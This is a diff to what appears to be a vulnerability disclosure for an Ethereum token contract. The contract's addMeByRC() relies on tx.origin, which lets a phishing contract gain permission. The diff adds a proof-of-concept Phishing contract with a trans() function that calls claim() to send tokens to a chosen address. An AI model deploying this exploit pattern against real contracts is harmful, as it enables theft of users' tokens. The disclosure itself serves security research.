@@ -17,6 +17,10 @@ https://etherscan.io/address/0x403E518F21F5Ce308085Dcf6637758C61f92446A#code
         
         emit NewRC(msg.sender);
     }
+    ...
+    function claim(address _buyer, uint256 _amount) onlyRC public returns(bool) {
+        return tokenContract.transfer(_buyer, _amount);
+    }
 ```
 
 In this contract, there is a function named addMeByRC() which can be exploited by phishing attacks to add the evil contract to the rc permission.
@@ -33,7 +37,12 @@ contract Phishing {
     function attack() {
         tscontract.addMeByRC();
     }
+    function trans() {
+        tscontract.claim(0x627306090abaB3A6e1400e9345bC60c78a8BEf57,100);    
+    }
     
 }
 ```
 when the owner click this link, the "require(tx.origin == owner)" was executed successfully，and then add our Phishing contract address to the rc permission. 
+
+Then we can use the trans() to transfer the Token to any address.
